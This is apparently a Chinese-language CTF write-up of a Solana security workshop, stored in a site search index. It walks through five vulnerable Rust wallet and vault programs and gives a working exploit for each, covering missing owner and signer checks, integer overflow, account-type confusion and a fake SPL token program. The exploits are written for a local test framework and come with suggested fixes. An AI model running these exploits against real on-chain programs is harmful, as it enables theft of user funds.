23 24 25 26 pub enum WalletInstruction { /// Initialize a Personal Savings Wallet /// /// Passed accounts: /// (1) Wallet account /// (2) Vault accounts /// (3) Authority /// (4) Rent sysvar /// (5) System program Initialize , /// Deposit /// /// Passed accounts: /// (1) Wallet account /// (2) Vault accounts /// (3) Money Source Deposit { amount : u64 }, /// Withdraw from Wallet /// /// Passed accounts: /// (1) Wallet account /// (2) Vault accounts /// (3) Authority /// (4) Target Wallet account Withdraw { amount : u64 }, } \u7a0b\u5e8f\u5165\u53e3\u70b9\u51fd\u6570 processor::process_instruction \u53cd\u5e8f\u5217\u5316 instruction_data \u5e76\u8c03\u7528\u6307\u5b9a\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 pub fn process_instruction ( program_id : & Pubkey , accounts : & [ AccountInfo ], mut instruction_data : & [ u8 ], ) -> ProgramResult { match WalletInstruction :: deserialize ( & mut instruction_data ) ? { WalletInstruction :: Initialize => initialize ( program_id , accounts ), WalletInstruction :: Deposit { amount } => deposit ( program_id , accounts , amount ), WalletInstruction :: Withdraw { amount } => withdraw ( program_id , accounts , amount ), } } \u8c03\u7528\u5176\u5b83\u7a0b\u5e8f\u53ef\u901a\u8fc7 invoke() \u6216 invoke_signed() \uff08\u5f53\u9700\u8981 PDA \u4f5c\u4e3a instruction \u7684 signer \u65f6\uff09 withdraw \u4e2d wallet \u3001 vault \u7b49\u8d26\u6237\u5747\u7531\u8c03\u7528\u8005\u63d0\u4f9b\uff0c\u4e14\u672a\u68c0\u67e5\u8d26\u6237 wallet \u7684 owner \uff0c\u56e0\u800c\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u653b\u51fb\u8005\u4f5c\u4e3a authority \u7684 wallet \u8d26\u6237\uff0c\u4ece\u800c\u8c03\u7528 withdraw \u83b7\u53d6 SOL 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 fn withdraw ( _program_id : & Pubkey , accounts : & [ AccountInfo ], amount : u64 ) -> ProgramResult { let account_info_iter = & mut accounts . iter (); let wallet_info = next_account_info ( account_info_iter ) ? ; let vault_info = next_account_info ( account_info_iter ) ? ; let authority_info = next_account_info ( account_info_iter ) ? ; let destination_info = next_account_info ( account_info_iter ) ? ; let wallet = Wallet :: deserialize ( & mut & ( * wallet_info . data ). borrow_mut ()[ .. ]) ? ; assert! ( authority_info . is_signer ); assert_eq! ( wallet . authority , * authority_info . key ); assert_eq! ( wallet . vault , * vault_info . key ); if amount > ** vault_info . lamports . borrow_mut () { return Err ( ProgramError :: InsufficientFunds ); } ** vault_info . lamports . borrow_mut () -= amount ; ** destination_info . lamports . borrow_mut () += amount ; Ok (()) } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 fn hack ( env : & mut LocalEnvironment , challenge : & Challenge ) { // Step 0: how much money do we want to steal? let amount = env . get_account ( challenge . vault_address ). unwrap (). lamports ; // `unwrap` returns a `panic` when it receives a `None` // Step 1: a fake wallet with the same vault let hacker_wallet = level0 :: Wallet { authority : challenge . hacker . pubkey (), vault : challenge . vault_address , }; let fake_wallet = keypair ( 233 ); let mut hack_wallet_data : Vec < u8 > = vec! []; hacker_wallet . serialize ( & mut hack_wallet_data ). unwrap (); env . create_account_with_data ( & fake_wallet , hack_wallet_data ); // Step 2: Use fake wallet to withdraw funds from the real vault to the attacker let instruction = Instruction { program_id : challenge . wallet_program , accounts : vec ! [ AccountMeta :: new ( fake_wallet . pubkey (), false ), AccountMeta :: new ( challenge . vault_address , false ), AccountMeta :: new ( challenge . hacker . pubkey (), true ), AccountMeta :: new ( challenge . hacker . pubkey (), false ), AccountMeta :: new_readonly ( system_program :: id (), false ), ], // add `use borsh::BorshSerialize;` to use `try_to_vec()` method data : level0 :: WalletInstruction :: Withdraw { amount }. try_to_vec (). unwrap (), }; env . execute_as_transaction ( & [ instruction ], & [ & challenge . hacker ]). print_named ( \"Hack: hacker withdraw\" ); } \u53c2\u8003\u8d44\u6599 \u00b6 Calling Between Programs | Solana Docs Environment in poc_framework - Rust Option & unwrap - Rust By Example Pubkey::find_program_address - Rust Level 1 - Personal Vault \u00b6 \u76f8\u6bd4\u4e8e Level 0\uff0c Wallet \u79fb\u9664\u4e86 vault \uff0c\u5e76\u4fdd\u6301\u4e86\u9664 vault \u5916\u5176\u5b83\u529f\u80fd\u7684\u4e00\u81f4\u6027 1 2 3 pub struct Wallet { pub authority : Pubkey , } withdraw \u4e2d wallet_info \u3001 authority_info \u4ecd\u7136\u7531\u8c03\u7528\u8005\u63d0\u4f9b\uff0c\u4e14\u53ea\u68c0\u67e5 wallet \u7684 owner \u662f\u5426\u4e3a\u5bf9\u5e94\u7a0b\u5e8f\u4ee5\u53ca wallet \u4e2d\u5b58\u50a8\u7684 authority \u4e0e\u63d0\u4f9b\u7684 authority_info \u662f\u5426\u5339\u914d\uff0c\u5e76\u6ca1\u6709\u68c0\u67e5 authority_info \u662f\u5426\u4e3a signer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 fn withdraw ( program_id : & Pubkey , accounts : & [ AccountInfo ], amount : u64 ) -> ProgramResult { msg ! ( \"withdraw {}\" , amount ); let account_info_iter = & mut accounts . iter (); let wallet_info = next_account_info ( account_info_iter ) ? ; let authority_info = next_account_info ( account_info_iter ) ? ; let destination_info = next_account_info ( account_info_iter ) ? ; let wallet = Wallet :: deserialize ( & mut & ( * wallet_info . data ). borrow_mut ()[ .. ]) ? ; assert_eq! ( wallet_info . owner , program_id ); assert_eq! ( wallet . authority , * authority_info . key ); if amount > ** wallet_info . lamports . borrow_mut () { return Err ( ProgramError :: InsufficientFunds ); } ** wallet_info . lamports . borrow_mut () -= amount ; ** destination_info . lamports . borrow_mut () += amount ; wallet . serialize ( & mut & mut ( * wallet_info . data ). borrow_mut ()[ .. ]) . unwrap (); Ok (()) } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 fn hack ( env : & mut LocalEnvironment , challenge : & Challenge ) { let amount = env . get_account ( challenge . wallet_address ). unwrap (). lamports ; let instruction = Instruction { program_id : challenge . wallet_program , accounts : vec ! [ AccountMeta :: new ( challenge . wallet_address , false ), AccountMeta :: new ( challenge . wallet_authority , false ), AccountMeta :: new ( challenge . hacker . pubkey (), true ), AccountMeta :: new_readonly ( system_program :: id (), false ), ], data : level1 :: WalletInstruction :: Withdraw { amount }. try_to_vec (). unwrap (), }; env . execute_as_transaction ( & [ instruction ], & [ & challenge . hacker ]). print_named ( \"Hack: hacker withdraw\" ); } Level 2 - Secure Personal Vault \u00b6 \u5728 Level 1 \u7684\u57fa\u7840\u4e0a\uff0c\u4fee\u590d\u4e86 withdraw \u672a\u68c0\u67e5 signer \u7684\u95ee\u9898 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 fn withdraw ( program_id : & Pubkey , accounts : & [ AccountInfo ], amount : u64 ) -> ProgramResult { msg ! ( \"withdraw {}\" , amount ); let account_info_iter = & mut accounts . iter (); let wallet_info = next_account_info ( account_info_iter ) ? ; let authority_info = next_account_info ( account_info_iter ) ? ; let destination_info = next_account_info ( account_info_iter ) ? ; let rent_info = next_account_info ( account_info_iter ) ? ; let wallet = Wallet :: deserialize ( & mut & ( * wallet_info . data ). borrow_mut ()[ .. ]) ? ; let rent = Rent :: from_account_info ( rent_info ) ? ; assert_eq! ( wallet_info . owner , program_id ); assert_eq! ( wallet . authority , * authority_info . key ); assert! ( authority_info . is_signer , \"authority must sign!\" ); let min_balance = rent . minimum_balance ( WALLET_LEN as usize ); if min_balance + amount > ** wallet_info . lamports . borrow_mut () { return Err ( ProgramError :: InsufficientFunds ); } ** wallet_info . lamports . borrow_mut () -= amount ; ** destination_info . lamports . borrow_mut () += amount ; wallet . serialize ( & mut & mut ( * wallet_info . data ). borrow_mut ()[ .. ]) . unwrap (); Ok (()) } \u5728 debug \u6a21\u5f0f\u4e0b\u7f16\u8bd1\u7a0b\u5e8f\uff0cRust \u5c06\u5bf9\u6574\u578b\u6ea2\u51fa\u629b\u51fa\u5f02\u5e38\uff0c\u800c\u5728 release \u6a21\u5f0f\u4e0b\uff0cRust \u5c06\u8fdb\u884c two's complement wrapping \uff0c\u4ee5 u8 \u4e3a\u4f8b\uff0c\u7ed3\u679c\u7b49\u540c\u4e8e\u6a21 \\(256\\) \u53ef\u4ee5\u901a\u8fc7 amount \u4f7f wallet_info \u8d26\u6237\u4e2d\u7684 lamports \u4e0b\u6ea2\u51fa\u6765\u83b7\u53d6\u8d44\u91d1\uff0c\u5e76\u4f7f destination_info \u8d26\u6237\u4e2d\u7684 lamports \u4e0a\u6ea2\u51fa\u6765\u51cf\u5c11\u5176\u8d44\u91d1 \u53e6\u5916\u8fd8\u9700\u901a\u8fc7\u4e0a\u6ea2\u51fa\u7ed5\u8fc7\u68c0\u67e5 min_balance + amount > **wallet_info.lamports.borrow_mut() \u63a8\u8350\u4f7f\u7528 checked_sub \u3001 checked_add Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 fn hack ( env : & mut LocalEnvironment , challenge : & Challenge ) { env . execute_as_transaction ( & [ level2 :: initialize ( challenge . wallet_program , challenge . hacker . pubkey ())], & [ & challenge . hacker ]). print_named ( \"Hacker: initialize wallet\" ); let hacker_wallet = level2 :: get_wallet_address ( challenge . hacker . pubkey (), challenge . wallet_program ); let min_balance = Rent :: default (). minimum_balance ( level2 :: WALLET_LEN as usize ); let amount = u64 :: max_value () - min_balance + 1 ; for i in 0 .. 10 { env . execute_as_transaction ( & [ Instruction { program_id : challenge . wallet_program , accounts : vec ! [ AccountMeta :: new ( hacker_wallet , false ), AccountMeta :: new ( challenge . hacker . pubkey (), true ), AccountMeta :: new ( challenge . wallet_address , false ), AccountMeta :: new_readonly ( sysvar :: rent :: id (), false ), ], data : level2 :: WalletInstruction :: Withdraw { amount : amount + i }. try_to_vec (). unwrap (), }], // \u4ea4\u6613 `recent_blockhash` \u76f8\u540c\uff0c\u56e0\u800c\u9700\u8981\u8bbe\u7f6e\u4e0d\u540c\u7684\u53c2\u6570\uff0c\u907f\u514d This transaction has already been processed & [ & challenge . hacker ]). print_named ( format! ( \"Hacker: exploit {}\" , i ). as_str ()); } env . execute_as_transaction ( & [ level2 :: withdraw ( challenge . wallet_program , challenge . hacker . pubkey (), challenge . hacker . pubkey (), env . get_account ( hacker_wallet ). unwrap (). lamports - min_balance )], & [ & challenge . hacker ]). print_named ( \"Hacker: withdraw\" ); } \u53c2\u8003\u8d44\u6599 \u00b6 Data Types - The Rust Programming Language anchor - How to avoid SendTransactionError \"This transaction has already been processed\" - Solana Stack Exchange Level 3 - Tip Pool \u00b6 \u67e5\u770b TipInstruction \uff0c\u521d\u6b65\u4e86\u89e3\u7a0b\u5e8f\u7684\u529f\u80fd\uff0c\u4efb\u4f55\u4eba\u53ef\u4ee5\u521b\u5efa TipPool \u6765\u63a5\u6536 tips\uff0c\u8d44\u91d1\u5b58\u50a8\u5728 Vault \u4e2d\uff0c withdraw \u65f6\u5c06\u4f9d\u636e TipPool \u4e2d\u5b58\u50a8\u7684 value TipInstruction 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 pub enum TipInstruction { /// Initialize a vault /// /// Passed accounts: /// /// (1) Vault account /// (2) initializer (must sign) /// (3) Rent sysvar /// (4) System Program Initialize { seed : u8 , fee : f64 , fee_recipient : Pubkey , }, /// Initialize a TipPool /// /// Passed accounts: /// /// (1) Vault account /// (2) withdraw_authority (must sign) /// (3) Pool account CreatePool , /// Tip /// /// Passed accounts: /// /// (1) Vault account /// (2) Pool /// (3) Tip Source /// (4) System program Tip { amount : u64 }, /// Withdraw from Pool /// /// Passed accounts: /// /// (1) Vault account /// (2) Pool account /// (3) withdraw_authority (must sign) Withdraw { amount : u64 }, } \u4e24\u79cd\u8d26\u6237\u7c7b\u578b\uff0c Vault \u548c TipPool \uff0c\u6ce8\u610f\u5230 Vault \u7684\u5b57\u6bb5\u6070\u597d\u80fd\u8986\u76d6 TipPool \u7684\u5b57\u6bb5 deserialize \u6839\u636e\u7ed9\u5b9a\u6570\u636e\u7c7b\u578b\u89e3\u6790\uff0c\u5e76\u66f4\u65b0 buffer\uff0c\u4f7f\u5176\u6307\u5411\u5269\u4f59\u5b57\u8282 1 2 3 4 5 6 7 8 9 10 11 12 pub struct TipPool { pub withdraw_authority : Pubkey , // Vault::creator pub value : u64 , // Vault::fee pub vault : Pubkey , // Vault::fee_recipient } pub struct Vault { pub creator : Pubkey , pub fee : f64 , pub fee_recipient : Pubkey , pub seed : u8 , } withdraw \u4e2d\u672a\u68c0\u67e5 pool_info \u662f\u5426\u662f TipPool \u7c7b\u578b\u7684\u6570\u636e\uff0c\u56e0\u800c\u53ef\u4ee5\u4f20\u5165 Vault \u7c7b\u578b\u7684\u6570\u636e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 fn withdraw ( program_id : & Pubkey , accounts : & [ AccountInfo ], amount : u64 ) -> ProgramResult { let account_info_iter = & mut accounts . iter (); let vault_info = next_account_info ( account_info_iter ) ? ; let pool_info = next_account_info ( account_info_iter ) ? ; let withdraw_authority_info = next_account_info ( account_info_iter ) ? ; let mut pool = TipPool :: deserialize ( & mut & ( * pool_info . data ). borrow_mut ()[ .. ]) ? ; assert_eq! ( vault_info . owner , program_id ); assert_eq! ( pool_info . owner , program_id ); assert! ( withdraw_authority_info . is_signer , \"withdraw authority must sign\" ); assert_eq! ( pool . vault , * vault_info . key ); assert_eq! ( * withdraw_authority_info . key , pool . withdraw_authority ); pool . value = match pool . value . checked_sub ( amount ) { Some ( v ) => v , None => return Err ( ProgramError :: InvalidArgument ), }; ** ( * vault_info ). lamports . borrow_mut () -= amount ; ** ( * withdraw_authority_info ). lamports . borrow_mut () += amount ; pool . serialize ( & mut & mut pool_info . data . borrow_mut ()[ .. ]). unwrap (); Ok (()) } \u901a\u8fc7 initialize \u6765\u63a7\u5236 Vault \u7c7b\u578b\u8d26\u6237\u5404\u4e2a\u5b57\u6bb5\u7684\u503c\uff0c\u5e76\u4f7f\u7528 Vault \u7c7b\u578b\u7684\u8d26\u6237\u6765\u4ee3\u66ff TipPool \u8fdb\u884c withdraw 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 fn initialize ( program_id : & Pubkey , accounts : & [ AccountInfo ], seed : u8 , fee : f64 , fee_recipient : Pubkey , ) -> ProgramResult { let account_info_iter = & mut accounts . iter (); let vault_info = next_account_info ( account_info_iter ) ? ; let initializer_info = next_account_info ( account_info_iter ) ? ; let rent_info = next_account_info ( account_info_iter ) ? ; let rent = Rent :: from_account_info ( rent_info ) ? ; // \u4f7f\u7528\u4e0d\u540c\u7684 seed \u6765\u83b7\u53d6\u4e0d\u540c\u7684 vault_address let vault_address = Pubkey :: create_program_address ( & [ & [ seed ]], program_id ). unwrap (); assert_eq! ( * vault_info . key , vault_address ); assert! ( vault_info . data_is_empty (), \"vault info must be empty account!\" ); assert! ( initializer_info . is_signer , \"initializer must sign!\" ); invoke_signed ( & system_instruction :: create_account ( & initializer_info . key , & vault_address , rent . minimum_balance ( VAULT_LEN as usize ), VAULT_LEN , & program_id , ), & [ initializer_info . clone (), vault_info . clone ()], & [ & [ & [ seed ]]], ) ? ; let vault = Vault { creator : * initializer_info . key , fee , fee_recipient , seed , }; vault . serialize ( & mut & mut vault_info . data . borrow_mut ()[ .. ]). unwrap (); Ok (()) } \u53ef\u589e\u52a0\u7c7b\u578b\u5b57\u6bb5\u6765\u907f\u514d Account Confusion 1 2 3 4 5 6 7 // e.g. pub struct TipPool { pub atype : u8 , // contain a unique identifier for this account type pub withdraw_authority : Pubkey , pub value : u64 , pub vault : Pubkey , } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 fn hack ( env : & mut LocalEnvironment , challenge : & Challenge ) { let pool : TipPool = env . get_deserialized_account ( challenge . tip_pool ). unwrap (); let seed = 1 ; let hacker_vault = Pubkey :: create_program_address ( & [ & [ seed ]], & challenge . tip_program ). unwrap (); env . execute_as_transaction ( & [ level3 :: initialize ( challenge . tip_program , hacker_vault , // new vault challenge . hacker . pubkey (), // creator <-> withdraw_authority seed , pool . value as f64 , // fee <-> value challenge . vault_address // fee_recipient <-> vault )], & [ & challenge . hacker ], ). print_named ( \"Hacker: initialize vault\" ); env . execute_as_transaction ( & [ level3 :: withdraw ( challenge . tip_program , challenge . vault_address , hacker_vault , challenge . hacker . pubkey (), pool . value , )], & [ & challenge . hacker ] ). print_named ( \"Hacker: withdraw\" ); } \u53c2\u8003\u8d44\u6599 \u00b6 Solana Smart Contracts: Common Pitfalls and How to Avoid Them BorshDeserialize in borsh::de - Rust Program Derived Addresses (PDAs) | Solana Cookbook Level 4 - SPL 1 -Token Vault \u00b6 \u6bcf\u4e00\u79cd\u7c7b\u578b\u7684 SPL \u4ee3\u5e01\u901a\u8fc7\u521b\u5efa\u4e00\u4e2a mint \u8d26\u6237\u6765\u58f0\u660e\uff0c mint \u8d26\u6237\u5b58\u50a8\u4ee3\u5e01\u5143\u6570\u636e\uff0c\u6bcf\u4e2a SPL \u4ee3\u5e01\u8d26\u6237\u5173\u8054 mint \u8d26\u6237 Associated Token Account Program \u6839\u636e\u7528\u6237\u7cfb\u7edf\u8d26\u6237\u548c mint \u8d26\u6237\u786e\u5b9a\u6027\u5730\u6d3e\u751f SPL \u4ee3\u5e01\u8d26\u6237\u3002\u65e0\u8bba\u521b\u5efa\u8005\uff0c create_associated_token_account \u7684\u6240\u6709\u8005\u90fd\u662f\u5bf9\u5e94\u7528\u6237\u7684\u7cfb\u7edf\u8d26\u6237 \u82e5 SPL \u4ee3\u5e01\u8d26\u6237\u5173\u8054\u539f\u751f mint \uff08SOL\uff09\uff0c\u5219\u8d26\u6237 SOL \u4f59\u989d\u4e0e\u4ee3\u5e01\u4f59\u989d\u4fdd\u6301\u4e00\u81f4 spl_token \u5728\u7248\u672c 3.1.1 \u6709\u91cd\u8981\u53d8\u66f4 \ud83d\udc40 1 2 3 // There's a mitigation for this bug in spl-token 3.1.1 // vendored_spl_token is an exact copy of spl-token 3.1.0, which doesn't have the mitigation yet use vendored_spl_token as spl_token ; \u5bf9\u6bd4 3.1.1 \u548c 3.1.0 \u7684\u6e90\u7801 2 \uff0c\u53d1\u73b0\u7248\u672c 3.1.1 \u4e3b\u8981\u65b0\u589e\u4e86\u5bf9\u63d0\u4f9b\u7684 SPL \u4ee3\u5e01\u7a0b\u5e8f ID \u7684\u68c0\u67e5 check_program_account(token_program_id)?; \uff0c\u800c token_program_id \u662f\u53ef\u63a7\u7684\uff0c\u90a3\u4e48\u5728\u7248\u672c 3.1.0 \u53ef\u4ee5\u90e8\u7f72\u6076\u610f\u7a0b\u5e8f\u6765\u64cd\u63a7\u6570\u636e \u7531 wallet_owner \u7684\u516c\u94a5\u548c wallet_program \u83b7\u5f97\u7a0b\u5e8f\u6d3e\u751f\u5730\u5740 wallet_address \uff0c\u662f\u6301\u6709 SPL \u4ee3\u5e01\u7684\u8d26\u6237\u5730\u5740 withdraw() \u4e2d\u8c03\u7528\u4e86 spl_token::instruction::transfer_checked() \uff0c\u90a3\u4e48\u5c06 spl_token \u6307\u5411\u53ef\u63a7\u7a0b\u5e8f\uff0c\u4ece\u800c\u80fd\u591f\u4ea4\u6362 source \u548c destination 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 fn withdraw ( program_id : & Pubkey , accounts : & [ AccountInfo ], amount : u64 ) -> ProgramResult { msg ! ( \"withdraw {}\" , amount ); let account_info_iter = & mut accounts . iter (); let wallet_info = next_account_info ( account_info_iter ) ? ; let authority_info = next_account_info ( account_info_iter ) ? ; let owner_info = next_account_info ( account_info_iter ) ? ; let destination_info = next_account_info ( account_info_iter ) ? ; let mint = next_account_info ( account_info_iter ) ? ; let spl_token = next_account_info ( account_info_iter ) ? ; let ( wallet_address , _ ) = get_wallet_address ( owner_info . key , program_id ); let ( authority_address , authority_seed ) = get_authority ( program_id ); assert_eq! ( wallet_info . key , & wallet_address ); assert_eq! ( authority_info . key , & authority_address ); assert! ( owner_info . is_signer , \"owner must sign!\" ); let decimals = mint . data . borrow ()[ 44 ]; invoke_signed ( & spl_token :: instruction :: transfer_checked ( & spl_token . key , & wallet_info . key , mint . key , destination_info . key , authority_info . key , & [], // signer_pubkeys amount , decimals , ). unwrap (), & [ wallet_info . clone (), destination_info . clone (), authority_info . clone (), mint . clone (), ], & [ & [ & [ authority_seed ]]], // \u5f53 signer_pubkeys \u4e3a\u7a7a\u65f6\uff0c\u7531 authority \u7b7e\u540d // \u6839\u636e bump seed \u6d3e\u751f\u51fa\u7684 account_info \u4e2d\u7684\u8d26\u6237\u4f5c\u4e3a signer ) ? ; Ok (()) } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 // pocs/src/bin/level4.rs fn hack ( env : & mut LocalEnvironment , challenge : & Challenge ) { let fake_spl_token_program = env . deploy_program ( \"target/deploy/level4_poc_contract.so\" ); let hacker_wallet = level4 :: get_wallet_address ( & challenge . hacker . pubkey (), & challenge . wallet_program ). 0 ; assert_tx_success ( env . execute_as_transaction ( & [ level4 :: initialize ( challenge . wallet_program , challenge . hacker . pubkey (), challenge . mint )], & [ & challenge . hacker ] )); env . execute_as_transaction ( & [ Instruction { program_id : challenge . wallet_program , accounts : vec ! [ AccountMeta :: new ( hacker_wallet , false ), // wallet_info AccountMeta :: new_readonly ( level4 :: get_authority ( & challenge . wallet_program ). 0 , false ), // authority_info AccountMeta :: new_readonly ( challenge . hacker . pubkey (), true ), // owner_info AccountMeta :: new ( challenge . wallet_address , false ), // destination_info AccountMeta :: new_readonly ( spl_token :: id (), false ), // mint // All the accounts that fake_spl_token_program::TransferChecked needs need to be // included, including the spl_token program being invoked. Since mint is not required // by spl_token::instruction::transfer, we use mint to include spl_token::id() AccountMeta :: new_readonly ( fake_spl_token_program , false ), // spl_token ], data : level4 :: WalletInstruction :: Withdraw { amount : sol_to_lamports ( 1_000_000.0 ) }. try_to_vec (). unwrap (), }], & [ & challenge . hacker ] ). print_named ( \"Hacker: withdraw\" ); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 // level4-poc-contract/src/lib.rs use solana_program ::{ account_info :: AccountInfo , entrypoint , entrypoint :: ProgramResult , program :: invoke , pubkey :: Pubkey , }; use spl_token :: instruction ::{ TokenInstruction , transfer }; entrypoint ! ( process_instruction ); pub fn process_instruction ( _program_id : & Pubkey , accounts : & [ AccountInfo ], instruction_data : & [ u8 ], ) -> ProgramResult { match TokenInstruction :: unpack ( instruction_data ). unwrap () { TokenInstruction :: TransferChecked { amount , .. } => { let source = & accounts [ 0 ]; let mint = & accounts [ 1 ]; let destination = & accounts [ 2 ]; let authority = & accounts [ 3 ]; invoke ( & transfer ( mint . key , // token_program_id destination . key , // source_pubkey source . key , // destination_pubkey authority . key , // It's already signed by the wallet program, so `invoke` is used & [], amount , ). unwrap (), // Order doesn't matter & [ source . clone (), destination . clone (), authority . clone (), ], ) } _ => Ok (()) } } \u53c2\u8003\u8d44\u6599 \u00b6 Supporting the SPL Token Standard Associated Token Account Program | Solana Program Library Docs TokenInstruction in spl_token::instruction - Rust spl_token::instruction - Rust instruction.rs - source invoke_signed in solana_sdk::program - Rust Program examples written in Rust Solana Program Library \u21a9 https://github.com/solana-labs/solana-program-library/compare/token-v3.1.0...token-v3.1.1?diff=unified \u21a9","title":"Solana Security Workshop"},{"location":"wargames/solana_security_workshop/#setup-full","text":"1 2 $ docker run --name breakpoint-workshop -p 2222 :22 -p 8383 :80 -e PASSWORD = \"password\" neodymelabs/breakpoint-workshop:latest-code-prebuilt # visit http://localhost:8383","title":"Setup - Full"},{"location":"wargames/solana_security_workshop/#compiling-the-contracts-and-running-the-exploits","text":"PoC \u6846\u67b6\u4ee3\u7801\u4f4d\u4e8e pocs \u76ee\u5f55\u4e0b VSCode \u4e2d Ctrl+Shift+B \u518d\u9009\u62e9 level \u6216\u901a\u8fc7\u547d\u4ee4\u884c\u7684\u65b9\u5f0f 1 2 3 4 5 # compile all contracts cargo build-bpf --workspace # run level0 exploit RUST_BACKTRACE = 1 cargo run --bin level0 Docker \u5185\u6709\u90e8\u5206\u547d\u4ee4\u7f3a\u5931\uff08e.g. bash >m<\uff09\u53ef\u80fd\u5bfc\u81f4\u6784\u5efa\u5931\u8d25\uff0c\u53ef\u5728\u672c\u5730\u6784\u5efa\u540e\u4e0a\u4f20","title":"Compiling the Contracts and Running the Exploits"},{"location":"wargames/solana_security_workshop/#exploit-outline","text":"\u521d\u59cb\u6301\u6709 1 SOL\uff0c\u76ee\u6807\u662f\u83b7\u5f97\u66f4\u591a\u7684 SOL","title":"Exploit Outline"},{"location":"wargames/solana_security_workshop/#level-0-a-first-vulnerability","text":"\u67e5\u770b WalletInstruction \uff0c\u521d\u6b65\u4e86\u89e3\u7a0b\u5e8f\u7684\u529f\u80fd 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 pub enum WalletInstruction { /// Initialize a Personal Savings Wallet /// /// Passed accounts: /// (1) Wallet account /// (2) Vault accounts /// (3) Authority /// (4) Rent sysvar /// (5) System program Initialize , /// Deposit /// /// Passed accounts: /// (1) Wallet account /// (2) Vault accounts /// (3) Money Source Deposit { amount : u64 }, /// Withdraw from Wallet /// /// Passed accounts: /// (1) Wallet account /// (2) Vault accounts /// (3) Authority /// (4) Target Wallet account Withdraw { amount : u64 }, } \u7a0b\u5e8f\u5165\u53e3\u70b9\u51fd\u6570 processor::process_instruction \u53cd\u5e8f\u5217\u5316 instruction_data \u5e76\u8c03\u7528\u6307\u5b9a\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 pub fn process_instruction ( program_id : & Pubkey , accounts : & [ AccountInfo ], mut instruction_data : & [ u8 ], ) -> ProgramResult { match WalletInstruction :: deserialize ( & mut instruction_data ) ? { WalletInstruction :: Initialize => initialize ( program_id , accounts ), WalletInstruction :: Deposit { amount } => deposit ( program_id , accounts , amount ), WalletInstruction :: Withdraw { amount } => withdraw ( program_id , accounts , amount ), } } \u8c03\u7528\u5176\u5b83\u7a0b\u5e8f\u53ef\u901a\u8fc7 invoke() \u6216 invoke_signed() \uff08\u5f53\u9700\u8981 PDA \u4f5c\u4e3a instruction \u7684 signer \u65f6\uff09 withdraw \u4e2d wallet \u3001 vault \u7b49\u8d26\u6237\u5747\u7531\u8c03\u7528\u8005\u63d0\u4f9b\uff0c\u4e14\u672a\u68c0\u67e5\u8d26\u6237 wallet \u7684 owner \uff0c\u56e0\u800c\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u653b\u51fb\u8005\u4f5c\u4e3a authority \u7684 wallet \u8d26\u6237\uff0c\u4ece\u800c\u8c03\u7528 withdraw \u83b7\u53d6 SOL 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 fn withdraw ( _program_id : & Pubkey , accounts : & [ AccountInfo ], amount : u64 ) -> ProgramResult { let account_info_iter = & mut accounts . iter (); let wallet_info = next_account_info ( account_info_iter ) ? ; let vault_info = next_account_info ( account_info_iter ) ? ; let authority_info = next_account_info ( account_info_iter ) ? ; let destination_info = next_account_info ( account_info_iter ) ? ; let wallet = Wallet :: deserialize ( & mut & ( * wallet_info . data ). borrow_mut ()[ .. ]) ? ; assert! ( authority_info . is_signer ); assert_eq! ( wallet . authority , * authority_info . key ); assert_eq! ( wallet . vault , * vault_info . key ); if amount > ** vault_info . lamports . borrow_mut () { return Err ( ProgramError :: InsufficientFunds ); } ** vault_info . lamports . borrow_mut () -= amount ; ** destination_info . lamports . borrow_mut () += amount ; Ok (()) }","title":"Level 0 - A First Vulnerability"},{"location":"wargames/solana_security_workshop/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 fn hack ( env : & mut LocalEnvironment , challenge : & Challenge ) { // Step 0: how much money do we want to steal? let amount = env . get_account ( challenge . vault_address ). unwrap (). lamports ; // `unwrap` returns a `panic` when it receives a `None` // Step 1: a fake wallet with the same vault let hacker_wallet = level0 :: Wallet { authority : challenge . hacker . pubkey (), vault : challenge . vault_address , }; let fake_wallet = keypair ( 233 ); let mut hack_wallet_data : Vec < u8 > = vec! []; hacker_wallet . serialize ( & mut hack_wallet_data ). unwrap (); env . create_account_with_data ( & fake_wallet , hack_wallet_data ); // Step 2: Use fake wallet to withdraw funds from the real vault to the attacker let instruction = Instruction { program_id : challenge . wallet_program , accounts : vec ! [ AccountMeta :: new ( fake_wallet . pubkey (), false ), AccountMeta :: new ( challenge . vault_address , false ), AccountMeta :: new ( challenge . hacker . pubkey (), true ), AccountMeta :: new ( challenge . hacker . pubkey (), false ), AccountMeta :: new_readonly ( system_program :: id (), false ), ], // add `use borsh::BorshSerialize;` to use `try_to_vec()` method data : level0 :: WalletInstruction :: Withdraw { amount }. try_to_vec (). unwrap 